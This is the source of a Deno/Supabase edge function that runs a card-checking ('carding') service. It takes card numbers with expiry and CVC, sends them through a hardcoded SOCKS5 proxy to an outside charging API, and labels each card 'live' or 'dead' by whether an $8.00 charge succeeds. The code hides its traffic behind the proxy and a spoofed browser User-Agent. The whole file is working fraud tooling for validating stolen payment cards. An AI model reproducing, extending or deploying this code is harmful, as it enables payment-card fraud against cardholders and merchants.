import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
};

const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY")!;

// API Configuration - use HTTPS
const API_BASE_URL = "https://web-production-7ad4f.up.railway.app/api";
const PROXY_IP = "138.197.124.55";
const PROXY_PORT = "9150";
const PROXY_TYPE = "sock5";

// API call with 55s timeout
const callApi = async (cc: string): Promise<{ status: string; message: string; rawResponse: string }> => {
  const timestamp = Date.now();
  const randomId = Math.random().toString(36).substring(2, 10);
  const apiUrl = `${API_BASE_URL}?cc=${encodeURIComponent(cc)}&proxy=${PROXY_IP}:${PROXY_PORT}&proxytype=${PROXY_TYPE}&_t=${timestamp}&_r=${randomId}`;
  
  console.log(`[STRIPE-CHARGE] Calling: ${apiUrl}`);
  
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 55000); // 55s timeout
  
  try {
    const response = await fetch(apiUrl, {
      method: 'GET',
      headers: { 
        'Accept': 'application/json, text/plain, */*',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Cache-Control': 'no-cache, no-store',
        'Pragma': 'no-cache',
      },
      signal: controller.signal,
    });
    
    clearTimeout(timeoutId);
    const rawText = await response.text();
    console.log(`[STRIPE-CHARGE] HTTP ${response.status}: ${rawText}`);
    
    // Handle empty/bad responses
    if (!rawText || rawText.trim() === '') {
      console.log(`[STRIPE-CHARGE] Empty response from API`);
      return { status: 'unknown', message: 'Empty response from API', rawResponse: 'Empty' };
    }
    
    let apiStatus = 'unknown';
    let apiMessage = rawText;
    
    try {
      const json = JSON.parse(rawText);
      console.log(`[STRIPE-CHARGE] Parsed JSON:`, JSON.stringify(json));
      
      // Extract message
      apiMessage = json.message || json.msg || json.response || rawText;
      
      // Status detection: prioritize full_response boolean
      if (json.full_response === true || json.status === 'CHARGED' || json.status === 'success') {
        apiStatus = 'live';
      } else if (json.full_response === false || json.status === 'DECLINED' || json.status === 'failed') {
        apiStatus = 'dead';
      } else {
        // Fallback to keyword detection in message
        const lower = (typeof apiMessage === 'string' ? apiMessage : JSON.stringify(apiMessage)).toLowerCase();
        if (lower.includes('success') || lower.includes('charged') || lower.includes('approved') || lower.includes('authenticated')) {
          apiStatus = 'live';
        } else if (lower.includes('declined') || lower.includes('invalid') || lower.includes('expired') || 
                   lower.includes('insufficient') || lower.includes('card_declined') || lower.includes('incorrect') ||
                   lower.includes('do_not_honor') || lower.includes('stolen') || lower.includes('lost') ||
                   lower.includes('restricted') || lower.includes('fraud')) {
          apiStatus = 'dead';
        }
      }
      
      console.log(`[STRIPE-CHARGE] Determined status: ${apiStatus}`);
    } catch (parseErr) {
      console.log(`[STRIPE-CHARGE] Non-JSON response, parsing as text`);
      // Non-JSON response - parse as text
      const lower = rawText.toLowerCase();
      if (lower.includes('charged') || lower.includes('success') || lower.includes('approved')) {
        apiStatus = 'live';
      } else if (lower.includes('declined') || lower.includes('invalid') || lower.includes('error') || lower.includes('failed')) {
        apiStatus = 'dead';
      }
    }
    
    return { status: apiStatus, message: apiMessage, rawResponse: rawText };
    
  } catch (error) {
    clearTimeout(timeoutId);
    const errMsg = error instanceof Error ? error.message : 'Unknown error';
    const isTimeout = errMsg.includes('abort') || errMsg.includes('timeout') || errMsg.includes('canceled') || errMsg.includes('signal');
    console.error(`[STRIPE-CHARGE] Fetch error: ${errMsg}`);
    // Return unknown for timeouts so frontend can retry
    return { 
      status: 'unknown', 
      message: isTimeout ? 'Gateway timeout - retrying...' : `Connection error: ${errMsg}`, 
      rawResponse: isTimeout ? 'TIMEOUT' : errMsg 
    };
  }
};

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const authHeader = req.headers.get("Authorization");
    if (!authHeader?.startsWith("Bearer ")) {
      return new Response(JSON.stringify({ error: "Unauthorized" }), 
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // Parse body first (faster than waiting for auth)
    const body = await req.json();
    const { cc } = body;
    
    if (!cc) {
      return new Response(JSON.stringify({ error: 'Card required', computedStatus: 'unknown' }), 
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    }

    // Quick format validation
    const parts = cc.split('|');
    if (parts.length < 4 || !parts[3] || parts[3].length < 3 || !/^\d+$/.test(parts[3])) {
      return new Response(JSON.stringify({ error: "Format: CardNumber|MM|YY|CVC", computedStatus: 'unknown' }), 
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    }

    // Start API call immediately while auth happens
    const apiPromise = callApi(cc);

    // Auth check in parallel
    const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
      global: { headers: { Authorization: authHeader } },
    });

    const { data: { user }, error: authError } = await supabase.auth.getUser();
    if (authError || !user) {
      return new Response(JSON.stringify({ error: "Invalid token" }), 
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // Ban check
    const { data: profile } = await supabase
      .from("profiles")
      .select("is_banned")
      .eq("user_id", user.id)
      .single();

    if (profile?.is_banned) {
      return new Response(JSON.stringify({ error: "Account suspended" }), 
        { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // Wait for API result
    const result = await apiPromise;
    
    return new Response(
      JSON.stringify({
        computedStatus: result.status,
        apiStatus: result.status === 'live' ? 'CHARGED' : result.status === 'dead' ? 'DECLINED' : 'UNKNOWN',
        apiMessage: result.message,
        apiTotal: '$8.00',
        status: result.status,
        message: result.message,
        rawResponse: result.rawResponse,
      }),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error) {
    const msg = error instanceof Error ? error.message : 'Error';
    return new Response(JSON.stringify({ error: msg, computedStatus: "unknown" }), 
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
  }
});
